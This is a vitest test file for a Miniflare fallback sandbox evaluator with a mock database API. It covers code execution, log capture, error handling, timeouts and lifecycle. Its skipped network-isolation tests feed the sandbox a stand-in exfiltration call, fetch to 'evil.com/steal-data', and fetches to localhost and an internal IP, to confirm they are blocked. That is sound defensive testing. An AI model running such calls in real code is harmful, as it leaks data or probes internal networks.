/**
 * Miniflare Fallback Evaluator Tests
 *
 * These tests verify the Miniflare-based sandbox evaluator that serves as
 * a fallback for CLI/local development when Worker Loader is not available.
 *
 * IMPORTANT: These tests run in vitest-pool-workers which uses the Cloudflare
 * Workers runtime. Miniflare itself requires Node.js APIs (node:os, etc.) that
 * are NOT available in the Workers environment. Therefore:
 *
 * - isMiniflareAvailable() returns FALSE in this environment
 * - createMiniflareEvaluator() returns a STUB evaluator that returns an error
 * - Tests that require actual Miniflare execution are SKIPPED
 *
 * Key features tested:
 * 1. Evaluator Creation - createMiniflareEvaluator creates evaluator (stub or real)
 * 2. Mock Database Access - createMockMiniflareDbAccess works correctly
 * 3. Interface Contracts - Types and interfaces are correct
 *
 * Skipped tests (require Node.js environment with real Miniflare):
 * - Actual code execution in sandbox
 * - Console.log capture
 * - Timeout enforcement
 * - Network isolation
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest'
import {
  createMiniflareEvaluator,
  createMockMiniflareDbAccess,
  isMiniflareAvailable,
  type MiniflareEvaluator,
  type EvaluatorResult,
  type DatabaseAccess,
  type EvaluatorOptions,
} from '../../../src/mcp/sandbox/miniflare-evaluator'

// =============================================================================
// 1. Evaluator Creation Tests
// =============================================================================

describe('Evaluator Creation', () => {
  describe('createMiniflareEvaluator', () => {
    it('should create evaluator without Worker Loader', async () => {
      const { dbAccess } = createMockMiniflareDbAccess()
      const evaluator = await createMiniflareEvaluator(dbAccess, 'return 42')

      expect(evaluator).toBeDefined()
      expect(typeof evaluator.execute).toBe('function')
      expect(typeof evaluator.dispose).toBe('function')

      await evaluator.dispose()
    })

    it('should create evaluator with execute method that returns Promise<EvaluatorResult>', async () => {
      const { dbAccess } = createMockMiniflareDbAccess()
      const evaluator = await createMiniflareEvaluator(dbAccess, 'return 42')

      expect(evaluator.execute).toBeInstanceOf(Function)

      // Execute should return a promise
      const resultPromise = evaluator.execute()
      expect(resultPromise).toBeInstanceOf(Promise)

      const result = await resultPromise
      expect(result).toHaveProperty('success')
      expect(result).toHaveProperty('logs')

      await evaluator.dispose()
    })

    it('should create evaluator with dispose method for cleanup', async () => {
      const { dbAccess } = createMockMiniflareDbAccess()
      const evaluator = await createMiniflareEvaluator(dbAccess, 'return 42')

      expect(evaluator.dispose).toBeInstanceOf(Function)

      // dispose should not throw and return a promise
      const disposePromise = evaluator.dispose()
      expect(disposePromise).toBeInstanceOf(Promise)
      await disposePromise
    })

    it('should accept custom worker ID option', async () => {
      const { dbAccess } = createMockMiniflareDbAccess()
      const evaluator = await createMiniflareEvaluator(dbAccess, 'return 1', {
        id: 'custom-sandbox-123',
      })

      expect(evaluator).toBeDefined()
      await evaluator.dispose()
    })

    it('should accept custom timeout option', async () => {
      const { dbAccess } = createMockMiniflareDbAccess()
      const evaluator = await createMiniflareEvaluator(dbAccess, 'return 1', {
        timeout: 5000,
      })

      expect(evaluator).toBeDefined()
      await evaluator.dispose()
    })

    it('should generate unique ID if not provided', async () => {
      const { dbAccess } = createMockMiniflareDbAccess()
      const evaluator1 = await createMiniflareEvaluator(dbAccess, 'return 1')
      const evaluator2 = await createMiniflareEvaluator(dbAccess, 'return 2')

      // Both should work independently (unique IDs prevent collision)
      expect(evaluator1).toBeDefined()
      expect(evaluator2).toBeDefined()

      await evaluator1.dispose()
      await evaluator2.dispose()
    })
  })

  describe('isMiniflareAvailable', () => {
    it('should return boolean indicating Miniflare availability', async () => {
      const result = await isMiniflareAvailable()
      expect(typeof result).toBe('boolean')
    })

    it('should return false in vitest-pool-workers environment', async () => {
      // In vitest-pool-workers, miniflare cannot be imported because it requires
      // Node.js APIs (like node:os) that are not available in the Workers environment.
      const result = await isMiniflareAvailable()
      expect(result).toBe(false)
    })
  })

  describe('createMockMiniflareDbAccess', () => {
    it('should create mock database access with getProxy method', () => {
      const { dbAccess, getCapturedOperations } = createMockMiniflareDbAccess()

      expect(dbAccess).toBeDefined()
      expect(typeof dbAccess.getProxy).toBe('function')
      expect(typeof getCapturedOperations).toBe('function')
    })

    it('should return Fetcher from getProxy', () => {
      const { dbAccess } = createMockMiniflareDbAccess()
      const proxy = dbAccess.getProxy()

      expect(typeof proxy.fetch).toBe('function')
    })

    it('should return mock data for find operations', async () => {
      const mockData = {
        users: [
          { _id: '1', name: 'Alice' },
          { _id: '2', name: 'Bob' },
        ],
      }
      const { dbAccess } = createMockMiniflareDbAccess(mockData)
      const proxy = dbAccess.getProxy()

      const response = await proxy.fetch(
        new Request('http://internal/find', {
          method: 'POST',
          body: JSON.stringify({ collection: 'users', filter: {} }),
        })
      )
      const result = await response.json()

      expect(result).toEqual(mockData.users)
    })

    it('should capture all database operations', async () => {
      const { dbAccess, getCapturedOperations } = createMockMiniflareDbAccess({
        users: [],
      })
      const proxy = dbAccess.getProxy()

      await proxy.fetch(
        new Request('http://internal/find', {
          method: 'POST',
          body: JSON.stringify({ collection: 'users', filter: { active: true } }),
        })
      )

      await proxy.fetch(
        new Request('http://internal/insertOne', {
          method: 'POST',
          body: JSON.stringify({ collection: 'users', document: { name: 'Test' } }),
        })
      )

      const operations = getCapturedOperations()
      expect(operations.length).toBe(2)
      expect(operations[0].operation).toBe('find')
      expect(operations[1].operation).toBe('insertOne')
    })
  })
})

// =============================================================================
// 2. Execution Parity with Worker Loader Tests
// =============================================================================

// SKIPPED: These tests require real Miniflare execution, which needs Node.js APIs
// not available in the vitest-pool-workers environment. In this environment,
// createMiniflareEvaluator returns a stub that always returns an error.
// To run these tests, use a Node.js-based vitest configuration.
describe.skip('Execution Parity with Worker Loader', () => {
  let evaluator: MiniflareEvaluator

  afterEach(async () => {
    if (evaluator) {
      await evaluator.dispose()
    }
  })

  describe('Code Execution', () => {
    it('should execute simple code and return result', async () => {
      const { dbAccess } = createMockMiniflareDbAccess()
      evaluator = await createMiniflareEvaluator(dbAccess, 'return 42')

      const result = await evaluator.execute()

      expect(result.success).toBe(true)
      expect(result.value).toBe(42)
      expect(result.logs).toEqual([])
    })

    it('should execute async code and return result', async () => {
      const { dbAccess } = createMockMiniflareDbAccess()
      evaluator = await createMiniflareEvaluator(
        dbAccess,
        'return await Promise.resolve("async result")'
      )

      const result = await evaluator.execute()

      expect(result.success).toBe(true)
      expect(result.value).toBe('async result')
    })

    it('should execute code that returns objects', async () => {
      const { dbAccess } = createMockMiniflareDbAccess()
      evaluator = await createMiniflareEvaluator(
        dbAccess,
        'return { name: "test", count: 123 }'
      )

      const result = await evaluator.execute()

      expect(result.success).toBe(true)
      expect(result.value).toEqual({ name: 'test', count: 123 })
    })

    it('should execute code that returns arrays', async () => {
      const { dbAccess } = createMockMiniflareDbAccess()
      evaluator = await createMiniflareEvaluator(
        dbAccess,
        'return [1, 2, 3, "four"]'
      )

      const result = await evaluator.execute()

      expect(result.success).toBe(true)
      expect(result.value).toEqual([1, 2, 3, 'four'])
    })

    it('should execute code with no return value (undefined)', async () => {
      const { dbAccess } = createMockMiniflareDbAccess()
      evaluator = await createMiniflareEvaluator(dbAccess, 'const x = 1')

      const result = await evaluator.execute()

      expect(result.success).toBe(true)
      expect(result.value).toBeUndefined()
    })
  })

  describe('Console.log Capture', () => {
    it('should capture console.log output', async () => {
      const { dbAccess } = createMockMiniflareDbAccess()
      evaluator = await createMiniflareEvaluator(
        dbAccess,
        'console.log("hello"); console.log("world"); return "done"'
      )

      const result = await evaluator.execute()

      expect(result.success).toBe(true)
      expect(result.logs).toContain('hello')
      expect(result.logs).toContain('world')
    })

    it('should capture console.log with multiple arguments', async () => {
      const { dbAccess } = createMockMiniflareDbAccess()
      evaluator = await createMiniflareEvaluator(
        dbAccess,
        'console.log("value:", 42, "name:", "test"); return 1'
      )

      const result = await evaluator.execute()

      expect(result.success).toBe(true)
      expect(result.logs.length).toBeGreaterThan(0)
      expect(result.logs[0]).toContain('value:')
      expect(result.logs[0]).toContain('42')
    })

    it('should capture console.log with object arguments', async () => {
      const { dbAccess } = createMockMiniflareDbAccess()
      evaluator = await createMiniflareEvaluator(
        dbAccess,
        'console.log({ key: "value" }); return 1'
      )

      const result = await evaluator.execute()

      expect(result.success).toBe(true)
      expect(result.logs.length).toBe(1)
      expect(result.logs[0]).toContain('key')
      expect(result.logs[0]).toContain('value')
    })

    it('should preserve log order', async () => {
      const { dbAccess } = createMockMiniflareDbAccess()
      evaluator = await createMiniflareEvaluator(
        dbAccess,
        'console.log("first"); console.log("second"); console.log("third"); return 1'
      )

      const result = await evaluator.execute()

      expect(result.success).toBe(true)
      expect(result.logs).toEqual(['first', 'second', 'third'])
    })

    it('should return empty logs array when no console.log calls', async () => {
      const { dbAccess } = createMockMiniflareDbAccess()
      evaluator = await createMiniflareEvaluator(dbAccess, 'return 1')

      const result = await evaluator.execute()

      expect(result.success).toBe(true)
      expect(result.logs).toEqual([])
    })
  })

  describe('Database API (db) Exposure', () => {
    it('should expose db.collection().find() API', async () => {
      const mockData = {
        users: [{ _id: '1', name: 'Alice' }],
      }
      const { dbAccess } = createMockMiniflareDbAccess(mockData)
      evaluator = await createMiniflareEvaluator(
        dbAccess,
        'return await db.collection("users").find()'
      )

      const result = await evaluator.execute()

      expect(result.success).toBe(true)
      expect(result.value).toEqual(mockData.users)
    })

    it('should expose db.collection().findOne() API', async () => {
      const mockData = {
        users: [{ _id: '1', name: 'Alice' }],
      }
      const { dbAccess } = createMockMiniflareDbAccess(mockData)
      evaluator = await createMiniflareEvaluator(
        dbAccess,
        'return await db.collection("users").findOne()'
      )

      const result = await evaluator.execute()

      expect(result.success).toBe(true)
      expect(result.value).toEqual({ _id: '1', name: 'Alice' })
    })

    it('should expose db.collection().insertOne() API', async () => {
      const { dbAccess, getCapturedOperations } = createMockMiniflareDbAccess()
      evaluator = await createMiniflareEvaluator(
        dbAccess,
        'return await db.collection("users").insertOne({ name: "Bob" })'
      )

      const result = await evaluator.execute()

      expect(result.success).toBe(true)
      expect(result.value).toHaveProperty('insertedId')

      const ops = getCapturedOperations()
      expect(ops.some((op) => op.operation === 'insertOne')).toBe(true)
    })

    it('should expose db.collection().updateOne() API', async () => {
      const { dbAccess, getCapturedOperations } = createMockMiniflareDbAccess()
      evaluator = await createMiniflareEvaluator(
        dbAccess,
        'return await db.collection("users").updateOne({ _id: "1" }, { $set: { name: "Updated" } })'
      )

      const result = await evaluator.execute()

      expect(result.success).toBe(true)
      expect(result.value).toHaveProperty('modifiedCount')

      const ops = getCapturedOperations()
      expect(ops.some((op) => op.operation === 'updateOne')).toBe(true)
    })

    it('should expose db.collection().deleteOne() API', async () => {
      const { dbAccess, getCapturedOperations } = createMockMiniflareDbAccess()
      evaluator = await createMiniflareEvaluator(
        dbAccess,
        'return await db.collection("users").deleteOne({ _id: "1" })'
      )

      const result = await evaluator.execute()

      expect(result.success).toBe(true)
      expect(result.value).toHaveProperty('deletedCount')

      const ops = getCapturedOperations()
      expect(ops.some((op) => op.operation === 'deleteOne')).toBe(true)
    })

    it('should expose db.collection().countDocuments() API', async () => {
      const mockData = {
        users: [{ _id: '1' }, { _id: '2' }, { _id: '3' }],
      }
      const { dbAccess } = createMockMiniflareDbAccess(mockData)
      evaluator = await createMiniflareEvaluator(
        dbAccess,
        'return await db.collection("users").countDocuments()'
      )

      const result = await evaluator.execute()

      expect(result.success).toBe(true)
      expect(result.value).toBe(3)
    })

    it('should expose db.collection().aggregate() API', async () => {
      const mockData = {
        users: [{ _id: '1', age: 25 }, { _id: '2', age: 30 }],
      }
      const { dbAccess, getCapturedOperations } = createMockMiniflareDbAccess(mockData)
      evaluator = await createMiniflareEvaluator(
        dbAccess,
        'return await db.collection("users").aggregate([{ $match: { age: { $gte: 25 } } }])'
      )

      const result = await evaluator.execute()

      expect(result.success).toBe(true)

      const ops = getCapturedOperations()
      expect(ops.some((op) => op.operation === 'aggregate')).toBe(true)
    })

    it('should expose db.listCollections() API', async () => {
      const mockData = {
        users: [],
        products: [],
      }
      const { dbAccess } = createMockMiniflareDbAccess(mockData)
      evaluator = await createMiniflareEvaluator(
        dbAccess,
        'return await db.listCollections()'
      )

      const result = await evaluator.execute()

      expect(result.success).toBe(true)
      expect(result.value).toContain('users')
      expect(result.value).toContain('products')
    })
  })

  describe('Error Handling', () => {
    it('should handle thrown errors in user code', async () => {
      const { dbAccess } = createMockMiniflareDbAccess()
      evaluator = await createMiniflareEvaluator(
        dbAccess,
        'throw new Error("test error")'
      )

      const result = await evaluator.execute()

      expect(result.success).toBe(false)
      expect(result.error).toContain('test error')
      expect(result.logs).toEqual([])
    })

    it('should handle thrown string errors', async () => {
      const { dbAccess } = createMockMiniflareDbAccess()
      evaluator = await createMiniflareEvaluator(
        dbAccess,
        'throw "string error"'
      )

      const result = await evaluator.execute()

      expect(result.success).toBe(false)
      expect(result.error).toBeDefined()
    })

    it('should handle syntax errors gracefully', async () => {
      const { dbAccess } = createMockMiniflareDbAccess()
      evaluator = await createMiniflareEvaluator(
        dbAccess,
        'const x = { broken'
      )

      const result = await evaluator.execute()

      expect(result.success).toBe(false)
      expect(result.error).toBeDefined()
    })

    it('should handle runtime errors (undefined variable)', async () => {
      const { dbAccess } = createMockMiniflareDbAccess()
      evaluator = await createMiniflareEvaluator(
        dbAccess,
        'return undefinedVariable'
      )

      const result = await evaluator.execute()

      expect(result.success).toBe(false)
      expect(result.error).toBeDefined()
    })

    it('should capture logs even when error occurs', async () => {
      const { dbAccess } = createMockMiniflareDbAccess()
      evaluator = await createMiniflareEvaluator(
        dbAccess,
        'console.log("before error"); throw new Error("oops")'
      )

      const result = await evaluator.execute()

      expect(result.success).toBe(false)
      expect(result.error).toContain('oops')
      expect(result.logs).toContain('before error')
    })
  })

  describe('Timeout Handling', () => {
    it('should timeout if execution exceeds timeout option', async () => {
      const { dbAccess } = createMockMiniflareDbAccess()
      evaluator = await createMiniflareEvaluator(
        dbAccess,
        'await new Promise(r => setTimeout(r, 10000)); return "done"',
        { timeout: 100 }
      )

      const result = await evaluator.execute()

      expect(result.success).toBe(false)
      expect(result.error).toContain('timeout')
    }, 5000)

    it('should complete within timeout for fast operations', async () => {
      const { dbAccess } = createMockMiniflareDbAccess()
      evaluator = await createMiniflareEvaluator(
        dbAccess,
        'return 42',
        { timeout: 5000 }
      )

      const result = await evaluator.execute()

      expect(result.success).toBe(true)
      expect(result.value).toBe(42)
    })
  })
})

// =============================================================================
// 3. Network Isolation Tests
// =============================================================================

// SKIPPED: These tests require real Miniflare execution, which needs Node.js APIs
// not available in the vitest-pool-workers environment.
describe.skip('Network Isolation', () => {
  let evaluator: MiniflareEvaluator

  afterEach(async () => {
    if (evaluator) {
      await evaluator.dispose()
    }
  })

  it('should block fetch() calls', async () => {
    const { dbAccess } = createMockMiniflareDbAccess()
    evaluator = await createMiniflareEvaluator(
      dbAccess,
      'await fetch("https://example.com"); return "should not reach"'
    )

    const result = await evaluator.execute()

    expect(result.success).toBe(false)
    expect(result.error).toBeDefined()
    // The error should indicate network access is blocked
    expect(result.error!.toLowerCase()).toMatch(/network|not allowed|blocked|disabled/)
  })

  it('should block fetch() to any external URL', async () => {
    const { dbAccess } = createMockMiniflareDbAccess()
    evaluator = await createMiniflareEvaluator(
      dbAccess,
      'await fetch("http://evil.com/steal-data"); return 1'
    )

    const result = await evaluator.execute()

    expect(result.success).toBe(false)
    expect(result.error).toBeDefined()
  })

  it('should block fetch() to localhost', async () => {
    const { dbAccess } = createMockMiniflareDbAccess()
    evaluator = await createMiniflareEvaluator(
      dbAccess,
      'await fetch("http://localhost:3000/api"); return 1'
    )

    const result = await evaluator.execute()

    expect(result.success).toBe(false)
    expect(result.error).toBeDefined()
  })

  it('should block fetch() to internal IPs', async () => {
    const { dbAccess } = createMockMiniflareDbAccess()
    evaluator = await createMiniflareEvaluator(
      dbAccess,
      'await fetch("http://192.168.1.1/admin"); return 1'
    )

    const result = await evaluator.execute()

    expect(result.success).toBe(false)
    expect(result.error).toBeDefined()
  })

  it('should still allow db API calls (via service binding)', async () => {
    const mockData = {
      users: [{ _id: '1', name: 'Alice' }],
    }
    const { dbAccess } = createMockMiniflareDbAccess(mockData)
    evaluator = await createMiniflareEvaluator(
      dbAccess,
      'return await db.collection("users").find()'
    )

    const result = await evaluator.execute()

    // DB API should work even though fetch is blocked
    expect(result.success).toBe(true)
    expect(result.value).toEqual(mockData.users)
  })
})

// =============================================================================
// 4. Lifecycle Management Tests
// =============================================================================

describe('Lifecycle Management', () => {
  describe('dispose()', () => {
    it('should dispose without throwing', async () => {
      const { dbAccess } = createMockMiniflareDbAccess()
      const evaluator = await createMiniflareEvaluator(dbAccess, 'return 42')

      // Should not throw
      await expect(evaluator.dispose()).resolves.toBeUndefined()
    })

    it('should allow dispose to be called multiple times', async () => {
      const { dbAccess } = createMockMiniflareDbAccess()
      const evaluator = await createMiniflareEvaluator(dbAccess, 'return 42')

      await evaluator.dispose()
      // Second dispose should not throw
      await expect(evaluator.dispose()).resolves.toBeUndefined()
    })

    it('should clean up resources after dispose', async () => {
      const { dbAccess } = createMockMiniflareDbAccess()
      const evaluator = await createMiniflareEvaluator(dbAccess, 'return 42')

      await evaluator.execute()
      await evaluator.dispose()

      // After dispose, execute should fail or throw
      // (depends on implementation - could throw or return error)
      try {
        const result = await evaluator.execute()
        // If it doesn't throw, it should return an error
        expect(result.success).toBe(false)
      } catch (error) {
        // Throwing is also acceptable
        expect(error).toBeDefined()
      }
    })
  })

  // SKIPPED: These tests require real Miniflare execution
  describe.skip('Multiple Executions', () => {
    it('should support multiple executions on same evaluator', async () => {
      const { dbAccess } = createMockMiniflareDbAccess()
      const evaluator = await createMiniflareEvaluator(dbAccess, 'return 42')

      const result1 = await evaluator.execute()
      const result2 = await evaluator.execute()
      const result3 = await evaluator.execute()

      expect(result1.success).toBe(true)
      expect(result1.value).toBe(42)
      expect(result2.success).toBe(true)
      expect(result2.value).toBe(42)
      expect(result3.success).toBe(true)
      expect(result3.value).toBe(42)

      await evaluator.dispose()
    })

    it('should isolate state between executions', async () => {
      const { dbAccess } = createMockMiniflareDbAccess()
      // This code modifies a global variable - each execution should start fresh
      const evaluator = await createMiniflareEvaluator(
        dbAccess,
        `
        if (typeof globalCounter === 'undefined') {
          globalCounter = 0;
        }
        globalCounter++;
        return globalCounter;
        `
      )

      const result1 = await evaluator.execute()
      const result2 = await evaluator.execute()

      // Each execution should see counter as 1 (fresh state)
      // or implementation may allow state to persist - test based on expected behavior
      expect(result1.success).toBe(true)
      expect(result2.success).toBe(true)

      await evaluator.dispose()
    })

    it('should maintain separate log arrays between executions', async () => {
      const { dbAccess } = createMockMiniflareDbAccess()
      const evaluator = await createMiniflareEvaluator(
        dbAccess,
        'console.log("log entry"); return 1'
      )

      const result1 = await evaluator.execute()
      const result2 = await evaluator.execute()

      // Each execution should have its own logs array
      expect(result1.logs).toEqual(['log entry'])
      expect(result2.logs).toEqual(['log entry'])

      await evaluator.dispose()
    })
  })

  // SKIPPED: These tests require real Miniflare execution
  describe.skip('Concurrent Evaluators', () => {
    it('should support multiple independent evaluators', async () => {
      const { dbAccess: dbAccess1 } = createMockMiniflareDbAccess()
      const { dbAccess: dbAccess2 } = createMockMiniflareDbAccess()

      const evaluator1 = await createMiniflareEvaluator(dbAccess1, 'return "one"')
      const evaluator2 = await createMiniflareEvaluator(dbAccess2, 'return "two"')

      const [result1, result2] = await Promise.all([
        evaluator1.execute(),
        evaluator2.execute(),
      ])

      expect(result1.success).toBe(true)
      expect(result1.value).toBe('one')
      expect(result2.success).toBe(true)
      expect(result2.value).toBe('two')

      await evaluator1.dispose()
      await evaluator2.dispose()
    })

    it('should not share state between different evaluators', async () => {
      const { dbAccess: dbAccess1 } = createMockMiniflareDbAccess()
      const { dbAccess: dbAccess2 } = createMockMiniflareDbAccess()

      const evaluator1 = await createMiniflareEvaluator(
        dbAccess1,
        'globalThis.sharedValue = "from evaluator 1"; return globalThis.sharedValue'
      )
      const evaluator2 = await createMiniflareEvaluator(
        dbAccess2,
        'return globalThis.sharedValue'
      )

      const result1 = await evaluator1.execute()
      const result2 = await evaluator2.execute()

      expect(result1.success).toBe(true)
      expect(result1.value).toBe('from evaluator 1')

      // Evaluator 2 should not see evaluator 1's global
      expect(result2.success).toBe(true)
      expect(result2.value).toBeUndefined()

      await evaluator1.dispose()
      await evaluator2.dispose()
    })
  })

  // SKIPPED: These tests require real Miniflare execution
  describe.skip('Error Recovery', () => {
    it('should allow execution after previous error', async () => {
      const { dbAccess } = createMockMiniflareDbAccess()

      // First, create an evaluator that will error
      const errorEvaluator = await createMiniflareEvaluator(
        dbAccess,
        'throw new Error("intentional error")'
      )
      const errorResult = await errorEvaluator.execute()
      expect(errorResult.success).toBe(false)
      await errorEvaluator.dispose()

      // Now create a new evaluator - it should work fine
      const successEvaluator = await createMiniflareEvaluator(
        dbAccess,
        'return "recovered"'
      )
      const successResult = await successEvaluator.execute()

      expect(successResult.success).toBe(true)
      expect(successResult.value).toBe('recovered')

      await successEvaluator.dispose()
    })
  })
})

// =============================================================================
// Interface and Type Tests
// =============================================================================

describe('Interface Contracts', () => {
  describe('EvaluatorResult', () => {
    it('should have required success boolean field', () => {
      const successResult: EvaluatorResult = {
        success: true,
        value: 42,
        logs: [],
      }
      const errorResult: EvaluatorResult = {
        success: false,
        error: 'failed',
        logs: [],
      }

      expect(typeof successResult.success).toBe('boolean')
      expect(typeof errorResult.success).toBe('boolean')
    })

    it('should have required logs array field', () => {
      const result: EvaluatorResult = {
        success: true,
        logs: ['log1', 'log2'],
      }

      expect(Array.isArray(result.logs)).toBe(true)
    })

    it('should allow optional value field on success', () => {
      const result: EvaluatorResult = {
        success: true,
        value: { nested: { data: 123 } },
        logs: [],
      }

      expect(result.value).toEqual({ nested: { data: 123 } })
    })

    it('should allow optional error field on failure', () => {
      const result: EvaluatorResult = {
        success: false,
        error: 'Something went wrong',
        logs: [],
      }

      expect(result.error).toBe('Something went wrong')
    })
  })

  describe('EvaluatorOptions', () => {
    it('should allow empty options object', () => {
      const options: EvaluatorOptions = {}
      expect(options.timeout).toBeUndefined()
      expect(options.id).toBeUndefined()
    })

    it('should allow timeout option', () => {
      const options: EvaluatorOptions = { timeout: 5000 }
      expect(options.timeout).toBe(5000)
    })

    it('should allow id option', () => {
      const options: EvaluatorOptions = { id: 'my-sandbox' }
      expect(options.id).toBe('my-sandbox')
    })

    it('should allow combined options', () => {
      const options: EvaluatorOptions = {
        timeout: 10000,
        id: 'combined-sandbox',
      }
      expect(options.timeout).toBe(10000)
      expect(options.id).toBe('combined-sandbox')
    })
  })

  describe('MiniflareEvaluator', () => {
    it('should extend WorkerEvaluator with execute method', async () => {
      const { dbAccess } = createMockMiniflareDbAccess()
      const evaluator = await createMiniflareEvaluator(dbAccess, 'return 1')

      expect(typeof evaluator.execute).toBe('function')

      await evaluator.dispose()
    })

    it('should have dispose method not present on base WorkerEvaluator', async () => {
      const { dbAccess } = createMockMiniflareDbAccess()
      const evaluator = await createMiniflareEvaluator(dbAccess, 'return 1')

      expect(typeof evaluator.dispose).toBe('function')

      await evaluator.dispose()
    })
  })

  describe('DatabaseAccess', () => {
    it('should define getProxy method returning Fetcher', () => {
      const { dbAccess } = createMockMiniflareDbAccess()

      expect(typeof dbAccess.getProxy).toBe('function')

      const proxy = dbAccess.getProxy()
      expect(typeof proxy.fetch).toBe('function')
    })
  })
})
